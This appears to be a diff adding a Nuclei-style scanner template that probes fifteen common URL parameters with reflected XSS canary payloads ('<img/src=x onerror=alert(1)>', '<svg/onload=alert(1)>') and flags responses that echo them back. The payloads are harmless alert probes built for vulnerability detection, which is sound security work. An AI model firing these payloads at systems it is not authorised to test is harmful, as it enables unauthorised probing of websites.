@@ -1,0 +1,47 @@
+id: whai-xss-reflected-params
+
+info:
+  name: Reflected XSS via Common Parameters
+  author: whitehat-ai
+  severity: high
+  description: Detects reflected XSS by injecting canary payloads into common parameters
+  tags: xss,reflected,injection
+  reference:
+    - https://portswigger.net/web-security/cross-site-scripting/reflected
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q=whai<img/src=x onerror=alert(1)>"
+      - "{{BaseURL}}/?search=whai<img/src=x onerror=alert(1)>"
+      - "{{BaseURL}}/?query=whai<img/src=x onerror=alert(1)>"
+      - "{{BaseURL}}/?name=whai<img/src=x onerror=alert(1)>"
+      - "{{BaseURL}}/?s=whai<img/src=x onerror=alert(1)>"
+      - "{{BaseURL}}/?keyword=whai<img/src=x onerror=alert(1)>"
+      - "{{BaseURL}}/?msg=whai<img/src=x onerror=alert(1)>"
+      - "{{BaseURL}}/?error=whai<img/src=x onerror=alert(1)>"
+      - "{{BaseURL}}/?redirect=whai<img/src=x onerror=alert(1)>"
+      - "{{BaseURL}}/?callback=whai<img/src=x onerror=alert(1)>"
+      - "{{BaseURL}}/?id=whai\"><img/src=x onerror=alert(1)>"
+      - "{{BaseURL}}/?email=whai\"><img/src=x onerror=alert(1)>"
+      - "{{BaseURL}}/?lang=whai<svg/onload=alert(1)>"
+      - "{{BaseURL}}/?page=whai<svg/onload=alert(1)>"
+      - "{{BaseURL}}/?view=whai<svg/onload=alert(1)>"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "<img/src=x onerror=alert\\(1\\)>"
+          - "<svg/onload=alert\\(1\\)>"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
